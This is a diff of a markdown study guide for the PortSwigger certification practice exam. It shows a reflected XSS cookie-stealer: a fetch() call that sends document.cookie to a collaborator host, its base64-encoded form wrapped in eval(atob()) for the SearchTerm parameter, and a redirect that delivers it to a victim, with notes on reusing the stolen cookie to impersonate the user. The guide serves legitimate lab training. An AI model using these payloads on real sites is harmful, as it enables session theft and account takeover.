@@ -611,10 +611,10 @@ ${alert(document.cookie)}
 >Below is the main cookie stealer payload before BASE 64 encoding it.  
 
 ```JavaScript
-fetch(`https://4z4age0ypb5wob9p61yppu13vu1lpbd0.oastify.com/?jsonc=` + window["document"]["cookie"])
+fetch(`https://COLLABORATOR.com/?jsonc=` + window["document"]["cookie"])
 ```  
 
->[Base64 encoded](https://www.base64encode.org/) value of the above cookie stealer payload.  
+>Next is encode payload using [Base64 encoded](https://www.base64encode.org/) value of the above cookie stealer payload.  
 
 ```
 ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==
@@ -640,7 +640,7 @@ ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20v
 
 ![Burp collaborator receiving request with base64 cookie value from our POC.](images/xss2.png)  
 
->[URL Encode](https://www.urlencoder.org/) all characters in this payload and use as the value of the `searchterm` parameter.  
+>[URL Encode](https://www.urlencoder.org/) all characters in this payload and use as the value of the `/?SearchTerm=` parameter.  
 
 ```html
 "-eval(atob("ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ=="))-"
@@ -656,7 +656,7 @@ location = "https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%
 
 ![(Deliver reflected xss to steal victim cookie.](images/xss1.png)  
 
->**NOTE:** `Deliver exploit to victim` few times if the active user do not send HTTP request to collaborator. Replace the current cookie value with the stolen cookie to impersonate the active user and move to [stage 2 of the practice exam](#sqlmap-boolean---based-blind).  
+>**NOTE:** `Deliver exploit to victim` few times if the active user do not send HTTP request to collaborator. Replace the current cookie value with the stolen cookie to impersonate the active user and move on to [Stage 2 of the Practice Exam](#sqlmap-boolean---based-blind).  
 
 [PortSwigger Practice Exam - Stage 1 - Foothold](https://portswigger.net/web-security/certification/takepracticeexam/index.html)  
   
